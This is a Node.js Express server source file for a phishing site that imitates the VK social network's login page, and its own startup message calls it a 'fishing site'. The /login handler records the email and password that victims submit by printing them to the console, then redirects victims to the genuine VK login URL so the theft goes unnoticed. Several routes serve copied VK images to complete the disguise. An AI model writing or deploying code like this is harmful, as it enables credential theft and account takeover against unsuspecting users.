const express = require("express");
const crypto = require('crypto');
const https = require('https');
const fs = require('fs');
var path = require('path');

var bodyParser = require('body-parser');

const port = process.env.PORT || 3000;
const app = express();

app.use(bodyParser.json());
app.use(express.json())

app.use(express.urlencoded({
  extended: true
}))

app.post('/login', (req, res) => {
  const username = req.body.email
  const pass = req.body.pass

  console.log(username);
  console.log(pass);

  res.redirect('https://login.vk.com/?act=login&_origin=https://m.vk.com&ip_h=8b2b681ed24f2add0e&lg_h=682e1608ba777f8207&role=pda&utf8=1');
  res.end()
})

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname + '/assets/index.html'));
})


// app.get('/logo_2x.png', (req, res) => {
//   res.sendFile(path.join(__dirname + '/assets/logo_2x.png'));
// })

app.get('/mobile_new.png', (req, res) => {
  res.sendFile(path.join(__dirname + '/assets/mobile_new.png'));
})

app.get('/blue_arrow.png', (req, res) => {
  res.sendFile(path.join(__dirname + '/assets/blue_arrow.png'));
})

app.get('/auth_social_networks.png', (req, res) => {
  res.sendFile(path.join(__dirname + '/assets/auth_social_networks.png'));
})

app.get('/button_close.png', (req, res) => {
  res.sendFile(path.join(__dirname + '/assets/button_close.png'));
})

// we will pass our 'app' to 'https' server
https.createServer({
  key: fs.readFileSync('key.key'),
  cert: fs.readFileSync('cert.crt'),
  passphrase: '7788'
}, app)
.listen(port, () => console.log('Listening fishing site on ' + port));